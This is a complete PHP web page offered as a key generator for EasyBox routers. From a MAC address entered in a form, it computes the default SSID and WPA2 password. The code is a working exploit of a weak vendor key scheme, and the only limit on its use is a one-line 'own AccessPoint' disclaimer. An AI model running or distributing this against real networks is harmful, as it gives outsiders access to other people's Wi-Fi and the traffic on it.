<?php
$mac = $_REQUEST['mac'];	// GET and POST
if ($mac) {
	$mac = str_replace(':', '', $mac);	// remove ':' if any
	if (strlen($mac) == 12) {
		echo 'MAC: ' . $mac . '<br />';
		
		$m = str_split($mac);
		list($m1, $m2, $m3, $m4, $m5, $m6, $m7, $m8, $m9, $m10, $m11, $m12) = $m;
		
		$smac = hexdec($m9 . $m10 . $m11 . $m12);
		echo 'SMAC: ' . $smac . '<br />';
		$smac = str_pad($smac, 5, '0', STR_PAD_LEFT);
		
		$s = str_split($smac);
		list($s6, $s7, $s8, $s9, $s10) = $s;
		
		$ssid = 'EasyBox-' . $m7 . $m8 . $m9 . $m10 . $s6 . $s10;
		echo 'SSID: ' . $ssid . '<br />';
		
		$k1 = hexdec($s7) + hexdec($s8) + hexdec($m11) + hexdec($m12);
		$k2 = hexdec($m9) + hexdec($m10) + hexdec($s9) + hexdec($s10);
		$k1 = hexdec(substr(dechex($k1), -1));
		$k2 = hexdec(substr(dechex($k2), -1));
		echo 'K1: ' . strtoupper(dechex($k1)) . '<br />';
		echo 'K2: ' . strtoupper(dechex($k2)) . '<br />';
		
		$x1 = $k1 ^ hexdec($s10);
		$x2 = $k1 ^ hexdec($s9);
		$x3 = $k1 ^ hexdec($s8);
		$y1 = $k2 ^ hexdec($m10);
		$y2 = $k2 ^ hexdec($m11);
		$y3 = $k2 ^ hexdec($m12);
		$z1 = hexdec($m11) ^ hexdec($s10);
		$z2 = hexdec($m12) ^ hexdec($s9);
		$z3 = $k1 ^ $k2;
		
		$key = strtoupper(dechex($x1) . dechex($y1) . dechex($z1) . dechex($x2) . dechex($y2) . dechex($z2) . dechex($x3) . dechex($y3) . dechex($z3));
		echo 'WPA-Key: ' . $key . '<br />';
	} else {
		echo 'Error, bad MAC format.<br />';
	}
	exit('<a href="easybox_keygen.php">Back</a>');
}
?>
EasyBox KeyGen for Standard WPA2-Password<br />
By Sebastian Petters<br />
http://www.wotan.cc<br />
<br />
Use this only on your own AccessPoint!<br />
<br />
Enter MAC-Adress in following format: 01234567890A<br />
<br />
<form method="POST" action="easybox_keygen.php" />
MAC: <input type="text" name="mac" />
<input type="submit" value="Submit" />
</form>